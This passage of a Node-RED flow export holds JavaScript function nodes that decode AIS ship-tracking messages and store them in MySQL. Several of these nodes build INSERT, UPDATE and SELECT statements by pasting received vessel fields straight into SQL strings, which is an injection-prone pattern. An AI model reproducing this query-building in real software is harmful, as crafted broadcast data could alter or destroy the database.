insertStatic+=column+\"='\"+value+\"'\";\n    i++;\n});\n// console.log(insertStatic);\nif(isUpdate){\n    insertStatic+=\",updated_at=UTC_TIMESTAMP() WHERE id=\"+parsed.ship_id;\n}else{\n    insertStatic+=\",created_at=UTC_TIMESTAMP(),updated_at=UTC_TIMESTAMP()\";\n}\nmsg.topic=insertStatic;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 500,
        "y": 120,
        "wires": [
            []
        ]
    },
    {
        "id": "9de0149ca7508f15",
        "type": "ais-decoder",
        "z": "7270f4f520a7cbf6",
        "name": "",
        "x": 130,
        "y": 60,
        "wires": [
            [
                "148207f366400827"
            ]
        ]
    },
    {
        "id": "148207f366400827",
        "type": "function",
        "z": "7270f4f520a7cbf6",
        "name": "",
        "func": "if(msg.payload===undefined){\n    msg.payload=0;\n}\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 260,
        "y": 60,
        "wires": [
            [
                "d5b6f36327186200"
            ]
        ]
    },
    {
        "id": "d2376b60045d1aac",
        "type": "function",
        "z": "9f8de59c262b7de1",
        "name": "",
        "func": "// var parsed={\"static\":{\"mmsi\":\"525019645\"},\"dynamic\":{\"station_id\":\"1\",\"sog\":0.3,\"cog\":15.6,\"bearing\":0,\"nav_status\":0,\"latitude\":-6.062245,\"longitude\":106.87224833333333,\"raim\":false,\"msg_type\":1,\"repeat_indicator\":0,\"position_accuracy\":0},\"destination\":{},\"draught\":{},\"ship_id\":0,\"time_stamp\":\"2020-10-01 10:27:50\",\"exists\":false};\nif(msg.parsed.ship_id===0){\n    msg.parsed.ship_id=msg.payload.insertId;\n}\nvar parsed=msg.parsed;\n\nObject.size = function(obj) {\n    var size = 0, key;\n    for (key in obj) {\n        if (obj.hasOwnProperty(key)) size++;\n    }\n    return size;\n};\n\nfunction addZero(i) {\n    if (i < 10) {\n      i = \"0\" + i;\n    }\n    return i;\n}\n\nvar dynamic=parsed.dynamic;\nvar destination=parsed.destination;\nvar draught=parsed.draught;\nvar dynamicSize = Object.size(dynamic);\nvar destinationSize = Object.size(destination);\nvar draughtSize = Object.size(draught);\n\nmsg.parsed.size={};\nmsg.parsed.size.dynamic=dynamicSize;\nmsg.parsed.size.destination=destinationSize;\nmsg.parsed.size.draught=draughtSize;\n\nvar d = new Date();\nvar suffix = String(d.getUTCFullYear())+String(addZero(d.getUTCMonth()+1));\nvar insertDynamic=\"INSERT INTO ais_dynamic_\"+suffix+\" set ship_id=\"+parsed.ship_id+\",\";\nvar updateDynamic=\"INSERT INTO ais_dynamic set ship_id=\"+parsed.ship_id+\",\";\nif(parsed.exists){\n    updateDynamic=\"UPDATE ais_dynamic set \";\n}\ni=1;\nObject.keys(dynamic).forEach(key => {\n\t// console.log(key, static[key]);\n    if(i>1){\n    \tinsertDynamic+=\",\";\n    \tupdateDynamic+=\",\";\n    }\n    var column = String(key);\n    var value = String(dynamic[key]);\n    if(value===\"undefined\"){\n        value=\"0\";\n    }\n    if(column===\"raim\"){\n        if(value===\"false\"){\n            value=\"0\";\n        }else{\n            value=\"1\";\n        }\n    }\n    if(column===\"latitude\" || column===\"longitude\"){\n        if(value!==\"0\" && value!==\"undefined\"){\n            insertDynamic+=column+\"='\"+value+\"'\";\n            updateDynamic+=column+\"='\"+value+\"'\";\n        }\n    }else{\n        insertDynamic+=column+\"='\"+value+\"'\";\n        updateDynamic+=column+\"='\"+value+\"'\";\n    }\n    i++;\n});\ninsertDynamic+=\",created_at=UTC_TIMESTAMP(),updated_at=UTC_TIMESTAMP()\";\nif(!parsed.exists){\n    updateDynamic+=\",created_at=UTC_TIMESTAMP(),updated_at=UTC_TIMESTAMP()\";\n}else{\n    updateDynamic+=\",updated_at=UTC_TIMESTAMP() WHERE ship_id=\"+parsed.ship_id;\n}\n\nmsg.insertDynamic=insertDynamic.replace(\",,,\", \",\");\nmsg.updateDynamic=updateDynamic.replace(\",,,\", \",\");\n\nvar insertDestination=0;\ni=1;\nif(destination.destination!==undefined){\n    var tempEta = destination.eta.toISOString().slice(0, 19).replace('T', ' ');\n    destination.eta = tempEta;\n    insertDestination=\"INSERT INTO ais_destination set ship_id=\"+parsed.ship_id+\",\";\n    Object.keys(destination).forEach(key => {\n    \t// console.log(key, static[key]);\n        if(i>1){\n        \tinsertDestination+=\",\";\n        }\n        var column = String(key);\n        var value = String(destination[key]);\n        // if(value===\"undefined\"){\n        //     value=\"0\";\n        // }\n        insertDestination+=column+\"='\"+value+\"'\";\n        i++;\n    });\n    insertDestination+=\",updated_at='\"+parsed.time_stamp+\"'\";\n    insertDestination=insertDestination.replace(\"\\\\\", \"\\\\\\\\\");\n}\nmsg.insertDestination=insertDestination;\n\nvar insertDraught=0;\ni=1;\nif(draught.draught!==undefined){\n    insertDraught=\"INSERT INTO ais_draught set ship_id=\"+parsed.ship_id+\",\";\n    Object.keys(draught).forEach(key => {\n    \t// console.log(key, static[key]);\n        if(i>1){\n        \tinsertDraught+=\",\";\n        }\n        var column = String(key);\n        var value = String(draught[key]);\n        // if(value===\"undefined\"){\n        //     value=\"0\";\n        // }\n        insertDraught+=column+\"='\"+value+\"'\";\n        i++;\n    });\n    insertDraught+=\",updated_at='\"+parsed.time_stamp+\"'\";\n}\nmsg.insertDraught=insertDraught;\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 140,
        "y": 180,
        "wires": [
            [
                "04ae55b28dfff270"
            ]
        ]
    },
    {
        "id": "04ae55b28dfff270",
        "type": "change",
        "z": "9f8de59c262b7de1",
        "name": "insertDynamic",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "insertDynamic",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 340,
        "y": 180,
        "wires": [
            []
        ]
    },
    {
        "id": "4506c6dcf9751299",
        "type": "change",
        "z": "9f8de59c262b7de1",
        "name": "updateDynamic",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "updateDynamic",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 340,
        "y": 240,
        "wires": [
            []
        ]
    },
    {
        "id": "06333236853bfae1",
        "type": "change",
        "z": "9f8de59c262b7de1",
        "name": "insertDestination",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "insertDestination",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 570,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "3c9bf3f04d2340c0",
        "type": "change",
        "z": "9f8de59c262b7de1",
        "name": "insertDraught",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "insertDraught",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 540,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "a3129761479bebbd",
        "type": "switch",
        "z": "9f8de59c262b7de1",
        "name": "checkDestination",
        "property": "insertDestination",
        "propertyType": "msg",
        "rules": [
            {
                "t": "neq",
                "v": "0",
                "vt": "num"
            },
            {
                "t": "eq",
                "v": "0",
                "vt": "num"
            }
        ],
        "checkall": "false",
        "repair": false,
        "outputs": 2,
        "x": 350,
        "y": 300,
        "wires": [
            [
                "06333236853bfae1"
            ],
            [
                "4704a8d760c26ca4"
            ]
        ]
    },
    {
        "id": "4704a8d760c26ca4",
        "type": "switch",
        "z": "9f8de59c262b7de1",
        "name": "checkDraught",
        "property": "insertDraught",
        "propertyType": "msg",
        "rules": [
            {
                "t": "neq",
                "v": "0",
                "vt": "num"
            },
            {
                "t": "eq",
                "v": "0",
                "vt": "num"
            }
        ],
        "checkall": "false",
        "repair": false,
        "outputs": 2,
        "x": 340,
        "y": 380,
        "wires": [
            [
                "3c9bf3f04d2340c0"
            ],
            []
        ]
    },
    {
        "id": "791ca52868337347",
        "type": "function",
        "z": "9f8de59c262b7de1",
        "name": "",
        "func": "var decoded=msg.payload;\nmsg.decoded=decoded;\nif(decoded!==undefined){\n    msg.sqlStatic=\"SELECT * from ais_static where mmsi='\"+msg.payload.senderMmsi+\"'\";\n    // msg.sqlDynamic=\"SELECT count() as total from ais_dynamic where mmsi='\"+msg.payload.senderMmsi+\"'\";\n}\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 560,
        "y": 60,
        "wires": [
            [
                "d306d82cefa9b14f"
            ]
        ]
    },
    {
        "id": "0204f1adc622e486",
        "type": "switch",
        "z": "9f8de59c262b7de1",
        "name": "If !Undefined",
        "property": "payload",
        "propertyType": "msg",
        "rules": [
            {
                "t": "neq",
                "v": "0",
                "vt": "num"
            },
            {
                "t": "eq",
                "v": "0",
                "vt": "str"
            }
        ],
        "checkall": "false",
        "repair": false,
        "outputs": 2,
        "x": 410,
        "y": 60,
        "wires": [
            [
                "791ca52868337347"
            ],
            []
        ]
    },
    {
        "id": "d306d82cefa9b14f",
        "type": "change",
        "z": "9f8de59c262b7de1",
        "name": "",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "sqlStatic",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 710,
        "y": 60,
        "wires": [
            []
        ]
    },
    {
        "id": "6d5f2d25d35ddda7",
        "type": "function",
        "z": "9f8de59c262b7de1",
        "name": "",
        "func": "// if (msg.payload && !msg.payload.length){\n//     msg.result=\"No Data\";\n// }else{\n//     msg.result=msg.payload.length;\n// }\n// return msg;\n\nfunction addZero(i) {\n    if (i < 10) {\n      i = \"0\" + i;\n    }\n    return i;\n}\n\nvar isDataExists=true;\nvar ship_id=0;\nvar aisData={static:{},dynamic:{},destination:{},draught:{}};\n\nif (msg.payload && !msg.payload.length){\n    isDataExists=false;\n}\n\nvar d = new Date();\nvar time_stamp = String(d.getUTCFullYear())+'-'+String(addZero(d.getUTCMonth()+1))+'-'+String(addZero(d.getUTCDate()))+' ';\ntime_stamp += String(addZero(d.getUTCHours()))+':'+String(addZero(d.getUTCMinutes()))+':'+String(addZero(d.getUTCSeconds()));\n\n//Init Ship ID\nif(!isDataExists){\n    ship_id=0;\n}else{\n    ship_id=msg.payload[0].id;\n}\naisData.ship_id=ship_id;\n//Static Data\naisData.static.mmsi=msg.decoded.senderMmsi,\naisData.static.callsign=msg.decoded.callsign,\naisData.static.vessel_name=msg.decoded.name,\naisData.static.imo=msg.decoded.shipId,\naisData.static.ship_type=msg.decoded.shipType,\naisData.static.dimension_a=msg.decoded.dimensionToBow,\naisData.static.dimension_b=msg.decoded.dimensionToStern,\naisData.static.dimension_c=msg.decoded.dimensionToPort,\naisData.static.dimension_d=msg.decoded.dimensionToStarboard,\naisData.static.fix_type=msg.decoded.fix_type,\n//Dynamic Data\naisData.dynamic.station_id=global.get('stationId'),\naisData.dynamic.sog=msg.decoded.speedOverGround,\naisData.dynamic.cog=msg.decoded.courseOverGround,\naisData.dynamic.heading=msg.decoded.trueHeading,\naisData.dynamic.turning_direction=msg.decoded.turningDirection,\naisData.dynamic.rot=msg.decoded.turningRate,\naisData.dynamic.bearing=0,\naisData.dynamic.nav_status=msg.decoded.navigationStatus,\naisData.dynamic.latitude=msg.decoded.latitude,\naisData.dynamic.longitude=msg.decoded.longitude,\naisData.dynamic.raim=msg.decoded.raim,\naisData.dynamic.msg_type=msg.decoded.messageType,\naisData.dynamic.repeat_indicator=msg.decoded.repeatIndicator,\naisData.dynamic.position_accuracy=msg.decoded.positionAccuracy,\n//Destination\naisData.destination.destination=msg.decoded.destination,\naisData.destination.eta=msg.decoded.eta,\n//Draught\naisData.draught.draught=msg.decoded.draught;\n//Timestamp\naisData.time_stamp=time_stamp;\n//isExists?\naisData.exists=isDataExists;\n\nmsg.parsed=aisData;\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 360,
        "y": 120,
        "wires": [
            [
                "275d49e4b399794b"
            ]
        ]
    },
    {
        "id": "275d49e4b399794b",
        "type": "function",
        "z": "9f8de59c262b7de1",
        "name": "",
        "func": "// var parsed={\"static\":{\"mmsi\":\"525019645\"},\"dynamic\":{\"station_id\":\"1\",\"sog\":0.3,\"cog\":15.6,\"bearing\":0,\"nav_status\":0,\"latitude\":-6.062245,\"longitude\":106.87224833333333,\"raim\":false,\"msg_type\":1,\"repeat_indicator\":0,\"position_accuracy\":0},\"destination\":{},\"draught\":{},\"ship_id\":0,\"time_stamp\":\"2020-10-01 10:27:50\",\"exists\":false};\nvar parsed=msg.parsed;\nObject.size = function(obj) {\n    var size = 0, key;\n    for (key in obj) {\n        if (obj.hasOwnProperty(key)) size++;\n    }\n    return size;\n};\nvar astatic=parsed.static;\nvar staticSize = Object.size(astatic);\n\nvar insertStatic;\nvar isUpdate=false;\nif(!parsed.exists){\n\tinsertStatic=\"INSERT INTO ais_static set \";\n}else{\n    insertStatic=\"UPDATE ais_static set \";\n    isUpdate=true;\n}\nvar i=1;\nObject.keys(astatic).forEach(key => {\n    // console.log(key, astatic[key]);\n    if(i>1){\n        insertStatic+=\",\";\n    }\n    var column = String(key);\n    var value = String(astatic[key]);\n    if(value===\"undefined\"){\n        value=0;\n        if(column==\"vessel_name\"){\n            value=\"\";\n        }else if(column==\"imo\"){\n            value=\"\";\n        }else if(column==\"callsign\"){\n            value=\"\";\n        }\n    }\n    insertStatic+=column+\"='\"+value+\"'\";\n    i++;\n});\n// console.log(insertStatic);\nif(isUpdate){\n    insertStatic+=\",updated_at=UTC_TIMESTAMP() WHERE id=\"+parsed.ship_id;\n}else{\n    insertStatic+=\",created_at=UTC_TIMESTAMP(),updated_at=UTC_TIMESTAMP()\";\n}\nmsg.topic=insertStatic;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 500,
        "y": 120,
        "wires": [
            []
        ]
    },
    {
        "id": "0ee1358dd073c5c2",
        "type": "function",
        "z": "9f8de59c262b7de1",
        "name": "",
        "func": "if(msg.payload===undefined){\n    msg.payload=0;\n}\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 260,
        "y": 60,
        "wires": [
            [
                "0204f1adc622e486"
            ]
        ]
    },
    {
        "id": "8f12f8aba2fa9968",
        "type": "function",
        "z": "37e155d714079b94",
        "name": "",
        "func": "// var parsed={\"static\":{\"mmsi\":\"525019645\"},\"dynamic\":{\"station_id\":\"1\",\"sog\":0.3,\"cog\":15.6,\"bearing\":0,\"nav_status\":0,\"latitude\":-6.062245,\"longitude\":106.87224833333333,\"raim\":false,\"msg_type\":1,\"repeat_indicator\":0,\"position_accuracy\":0},\"destination\":{},\"draught\":{},\"ship_id\":0,\"time_stamp\":\"2020-10-01 10:27:50\",\"exists\":false};\nif(msg.parsed.ship_id===0){\n    msg.parsed.ship_id=msg.payload.insertId;\n}\nvar parsed=msg.parsed;\n\nObject.size = function(obj) {\n    var size = 0, key;\n    for (key in obj) {\n        if (obj.hasOwnProperty(key)) size++;\n    }\n    return size;\n};\n\nfunction addZero(i) {\n    if (i < 10) {\n      i = \"0\" + i;\n    }\n    return i;\n}\n\nvar dynamic=parsed.dynamic;\nvar destination=parsed.destination;\nvar draught=parsed.draught;\nvar dynamicSize = Object.size(dynamic);\nvar destinationSize = Object.size(destination);\nvar draughtSize = Object.size(draught);\n\nmsg.parsed.size={};\nmsg.parsed.size.dynamic=dynamicSize;\nmsg.parsed.size.destination=destinationSize;\nmsg.parsed.size.draught=draughtSize;\n\nvar d = new Date();\nvar suffix = String(d.getUTCFullYear())+String(addZero(d.getUTCMonth()+1));\nvar insertDynamic=\"INSERT INTO ais_dynamic_\"+suffix+\" set ship_id=\"+parsed.ship_id+\",\";\nvar updateDynamic=\"INSERT INTO ais_dynamic set ship_id=\"+parsed.ship_id+\",\";\nif(parsed.exists){\n    updateDynamic=\"UPDATE ais_dynamic set \";\n}\ni=1;\nObject.keys(dynamic).forEach(key => {\n\t// console.log(key, static[key]);\n    if(i>1){\n    \tinsertDynamic+=\",\";\n    \tupdateDynamic+=\",\";\n    }\n    var column = String(key);\n    var value = String(dynamic[key]);\n    if(value===\"undefined\"){\n        value=\"0\";\n    }\n    if(column===\"raim\"){\n        if(value===\"false\"){\n            value=\"0\";\n        }else{\n            value=\"1\";\n        }\n    }\n    if(column===\"latitude\" || column===\"longitude\"){\n        if(value!==\"0\" && value!==\"undefined\"){\n            insertDynamic+=column+\"='\"+value+\"'\";\n            updateDynamic+=column+\"='\"+value+\"'\";\n        }\n    }else{\n        insertDynamic+=column+\"='\"+value+\"'\";\n        updateDynamic+=column+\"='\"+value+\"'\";\n    }\n    i++;\n});\ninsertDynamic+=\",created_at=UTC_TIMESTAMP(),updated_at=UTC_TIMESTAMP()\";\nif(!parsed.exists){\n    updateDynamic+=\",created_at=UTC_TIMESTAMP(),updated_at=UTC_TIMESTAMP()\";\n}else{\n    updateDynamic+=\",updated_at=UTC_TIMESTAMP() WHERE ship_id=\"+parsed.ship_id;\n}\n\nmsg.insertDynamic=insertDynamic.replace(\",,,\", \",\");\nmsg.updateDynamic=updateDynamic.replace(\",,,\", \",\");\n\nvar insertDestination=0;\ni=1;\nif(destination.destination!==undefined){\n    var tempEta = destination.eta.toISOString().slice(0, 19).replace('T', ' ');\n    destination.eta = tempEta;\n    insertDestination=\"INSERT INTO ais_destination set ship_id=\"+parsed.ship_id+\",\";\n    Object.keys(destination).forEach(key => {\n    \t// console.log(key, static[key]);\n        if(i>1){\n        \tinsertDestination+=\",\";\n        }\n        var column = String(key);\n        var value = String(destination[key]);\n        // if(value===\"undefined\"){\n        //     value=\"0\";\n        // }\n        insertDestination+=column+\"='\"+value+\"'\";\n        i++;\n    });\n    insertDestination+=\",updated_at='\"+parsed.time_stamp+\"'\";\n    insertDestination=insertDestination.replace(\"\\\\\", \"\\\\\\\\\");\n}\nmsg.insertDestination=insertDestination;\n\nvar insertDraught=0;\ni=1;\nif(draught.draught!==undefined){\n    insertDraught=\"INSERT INTO ais_draught set ship_id=\"+parsed.ship_id+\",\";\n    Object.keys(draught).forEach(key => {\n    \t// console.log(key, static[key]);\n        if(i>1){\n        \tinsertDraught+=\",\";\n        }\n        var column = String(key);\n        var value = String(draught[key]);\n        // if(value===\"undefined\"){\n        //     value=\"0\";\n        // }\n        insertDraught+=column+\"='\"+value+\"'\";\n        i++;\n    });\n    insertDraught+=\",updated_at='\"+parsed.time_stamp+\"'\";\n}\nmsg.insertDraught=insertDraught;\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 140,
        "y": 180,
        "wires": [
            [
                "51b74a8fc7760613"
            ]
        ]
    },
    {
        "id": "51b74a8fc7760613",
        "type": "change",
        "z": "37e155d714079b94",
        "name": "insertDynamic",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "insertDynamic",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 340,
        "y": 180,
        "wires": [
            []
        ]
    },
    {
        "id": "1c97481b23328a6c",
        "type": "change",
        "z": "37e155d714079b94",
        "name": "updateDynamic",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "updateDynamic",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 340,
        "y": 240,
        "wires": [
            []
        ]
    },
    {
        "id": "afe7b75f9d70eebb",
        "type": "change",
        "z": "37e155d714079b94",
        "name": "insertDestination",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "insertDestination",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 570,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "a413eae90d37a94d",
        "type": "change",
        "z": "37e155d714079b94",
        "name": "insertDraught",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "insertDraught",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 540,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "678a512a87901f19",
        "type": "switch",
        "z": "37e155d714079b94",
        "name": "checkDestination",
        "property": "insertDestination",
        "propertyType": "msg",
        "rules": [
            {
                "t": "neq",
                "v": "0",
                "vt": "num"
            },
            {
                "t": "eq",
                "v": "0",
                "vt": "num"
            }
        ],
        "checkall": "false",
        "repair": false,
        "outputs": 2,
        "x": 350,
        "y": 300,
        "wires": [
            [
                "afe7b75f9d70eebb"
            ],
            [
                "1a748f5cd8e44dd0"
            ]
        ]
    },
    {
        "id": "1a748f5cd8e44dd0",
        "type": "switch",
        "z": "37e155d714079b94",
        "name": "checkDraught",
        "property": "insertDraught",
        "propertyType": "msg",
        "rules": [
            {
                "t": "neq",
                "v": "0",
                "vt": "num"
            },
            {
                "t": "eq",
                "v": "0",
                "vt": "num"
            }
        ],
        "checkall": "false",
        "repair": false,
        "outputs": 2,
        "x": 340,
        "y": 380,
        "wires": [
            [
                "a413eae90d37a94d"
            ],
            []
        ]
    },
    {
        "id": "95a368c73b2cc613",
        "type": "function",
        "z": "37e155d714079b94",
        "name": "",
        "func": "var decoded=msg.payload;\nmsg.decoded=decoded;\nif(decoded!==undefined){\n    msg.sqlStatic=\"SELECT * from ais_static where mmsi='\"+msg.payload.senderMmsi+\"'\";\n    // msg.sqlDynamic=\"SELECT count() as total from ais_dynamic where mmsi='\"+msg.payload.senderMmsi+\"'\";\n}\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 560,
        "y": 60,
        "wires": [
            [
                "95def9b5586bdb79"
            ]
        ]
    },
    {
        "id": "245ec52f8534cf52",
        "type": "switch",
        "z": "37e155d714079b94",
        "name": "If !Undefined",
        "property": "payload",
        "propertyType": "msg",
        "rules": [
            {
                "t": "neq",
                "v": "0",
                "vt": "num"
            },
            {
                "t": "eq",
                "v": "0",
                "vt": "str"
            }
        ],
        "checkall": "false",
        "repair": false,
        "outputs": 2,
        "x": 410,
        "y": 60,
        "wires": [
            [
                "95a368c73b2cc613"
            ],
            []
        ]
    },
    {
        "id": "95def9b5586bdb79",
        "type": "change",
        "z": "37e155d714079b94",
        "name": "",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "sqlStatic",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 710,
        "y": 60,
        "wires": [
            []
        ]
    },
    {
        "id": "e1abb2e621c296da",
        "type": "function",
        "z": "37e155d714079b94",
        "name": "",
        "func": "// if (msg.payload && !msg.payload.length){\n//     msg.result=\"No Data\";\n// }else{\n//     msg.result=msg.payload.length;\n// }\n// return msg;\n\nfunction addZero(i) {\n    if (i < 10) {\n      i = \"0\" + i;\n    }\n    return i;\n}\n\nvar isDataExists=true;\nvar ship_id=0;\nvar aisData={static:{},dynamic:{},destination:{},draught:{}};\n\nif (msg.payload && !msg.payload.length){\n    isDataExists=false;\n}\n\nvar d = new Date();\nvar time_stamp = String(d.getUTCFullYear())+'-'+String(addZero(d.getUTCMonth()+1))+'-'+String(addZero(d.getUTCDate()))+' ';\ntime_stamp += String(addZero(d.getUTCHours()))+':'+String(addZero(d.getUTCMinutes()))+':'+String(addZero(d.getUTCSeconds()));\n\n//Init Ship ID\nif(!isDataExists){\n    ship_id=0;\n}else{\n    ship_id=msg.payload[0].id;\n}\naisData.ship_id=ship_id;\n//Static Data\naisData.static.mmsi=msg.decoded.senderMmsi,\naisData.static.callsign=msg.decoded.callsign,\naisData.static.vessel_name=msg.decoded.name,\naisData.static.imo=msg.decoded.shipId,\naisData.static.ship_type=msg.decoded.shipType,\naisData.static.dimension_a=msg.decoded.dimensionToBow,\naisData.static.dimension_b=msg.decoded.dimensionToStern,\naisData.static.dimension_c=msg.decoded.dimensionToPort,\naisData.static.dimension_d=msg.decoded.dimensionToStarboard,\naisData.static.fix_type=msg.decoded.fix_type,\n//Dynamic Data\naisData.dynamic.station_id=global.get('stationId'),\naisData.dynamic.sog=msg.decoded.speedOverGround,\naisData.dynamic.cog=msg.decoded.courseOverGround,\naisData.dynamic.heading=msg.decoded.trueHeading,\naisData.dynamic.turning_direction=msg.decoded.turningDirection,\naisData.dynamic.rot=msg.decoded.turningRate,\naisData.dynamic.bearing=0,\naisData.dynamic.nav_status=msg.decoded.navigationStatus,\naisData.dynamic.latitude=msg.decoded.latitude,\naisData.dynamic.longitude=msg.decoded.longitude,\naisData.dynamic.raim=msg.decoded.raim,\naisData.dynamic.msg_type=msg.decoded.messageType,\naisData.dynamic.repeat_indicator=msg.decoded.repeatIndicator,\naisData.dynamic.position_accuracy=msg.decoded.positionAccuracy,\n//Destination\naisData.destination.destination=msg.decoded.destination,\naisData.destination.eta=msg.decoded.eta,\n//Draught\naisData.draught.draught=msg.decoded.draught;\n//Timestamp\naisData.time_stamp=time_stamp;\n//isExists?\naisData.exists=isDataExists;\n\nmsg.parsed=aisData;\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 360,
        "y": 120,
        "wires": [
            [
                "7274aa47139b24c0"
            ]
        ]
    },
    {
        "id": "7274aa47139b24c0",
        "type": "function",
        "z": "37e155d714079b94",
        "name": "",
        "func": "// var parsed={\"static\":{\"mmsi\":\"525019645\"},\"dynamic\":{\"station_id\":\"1\",\"sog\":0.3,\"cog\":15.6,\"bearing\":0,\"nav_status\":0,\"latitude\":-6.062245,\"longitude\":106.87224833333333,\"raim\":false,\"msg_type\":1,\"repeat_indicator\":0,\"position_accuracy\":0},\"destination\":{},\"draught\":{},\"ship_id\":0,\"time_stamp\":\"2020-10-01 10:27:50\",\"exists\":false};\nvar parsed=msg.parsed;\nObject.size = function(obj) {\n    var size = 0, key;\n    for (key in obj) {\n        if (obj.hasOwnProperty(key)) size++;\n    }\n    return size;\n};\nvar astatic=parsed.static;\nvar staticSize = Object.size(astatic);\n\nvar insertStatic;\nvar isUpdate=false;\nif(!parsed.exists){\n\tinsertStatic=\"INSERT INTO ais_static set \";\n}else{\n    insertStatic=\"UPDATE ais_static set \";\n    isUpdate=true;\n}\nvar i=1;\nObject.keys(astatic).forEach(key => {\n    // console.log(key, astatic[key]);\n    if(i>1){\n        insertStatic+=\",\";\n    }\n    var column = String(key);\n    var value = String(astatic[key]);\n    if(value===\"undefined\"){\n        value=0;\n        if(column==\"vessel_name\"){\n            value=\"\";\n        }else if(column==\"imo\"){\n            value=\"\";\n        }else if(column==\"callsign\"){\n            value=\"\";\n        }\n    }\n    insertStatic+=column+\"='\"+value+\"'\";\n    i++;\n});\n// console.log(insertStatic);\nif(isUpdate){\n    insertStatic+=\",updated_at=UTC_TIMESTAMP() WHERE id=\"+parsed.ship_id;\n}else{\n    insertStatic+=\",created_at=UTC_TIMESTAMP(),updated_at=UTC_TIMESTAMP()\";\n}\nmsg.topic=insertStatic;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 500,
        "y": 120,
        "wires": [
            []
        ]
    },
    {
        "id": "4fca860cbdd4d505",
        "type": "function",
        "z": "37e155d714079b94",
        "name": "",
        "func": "if(msg.payload===undefined){\n    msg.payload=0;\n}\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 260,
        "y": 60,
        "wires": [
            [
                "245ec52f8534cf52"
            ]
        ]
    },
    {
        "id": "ccd2d9eb83b77679",
        "type": "mqtt in",
        "z": "faa1600f64cd9251",
        "name": "",
        "topic": "aisdatastaticfak",
        "qos": "2",
        "datatype": "json",
        "broker": "fa4efe60b7e3b6f6",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 140,
        "y": 40,
        "wires": [
            [
                "875b1d8ea912f86a"
            ]
        ]
    },
    {
        "id": "2b1d86ae34a044cb",
        "type": "debug",
        "z": "faa1600f64cd9251",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 770,
        "y": 40,
        "wires": []
    },
    {
        "id": "4a4771d85a5b1d30",
        "type": "mqtt in",
        "z": "faa1600f64cd9251",
        "name": "",
        "topic": "aisdataloggerfak",
        "qos": "2",
        "datatype": "json",
        "broker": "fa4efe60b7e3b6f6",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 140,
        "y": 120,
        "wires": [
            [
                "bde6c50374bf78a0"
            ]
        ]
    },
    {
        "id": "6193fe73bd5a668a",
        "type": "debug",
        "z": "faa1600f64cd9251",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 830,
        "y": 120,
        "wires": []
    },
    {
        "id": "61782f364b8e1885",
        "type": "mqtt in",
        "z": "faa1600f64cd9251",
        "name": "",
        "topic": "aisdatamatang",
        "qos": "2",
        "datatype": "json",
        "broker": "fa4efe60b7e3b6f6",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 140,
        "y": 200,
        "wires": [
            [
                "7370756278fb24d6"
            ]
        ]
    },
    {
        "id": "b4260a9ad003e6cd",
        "type": "mqtt in",
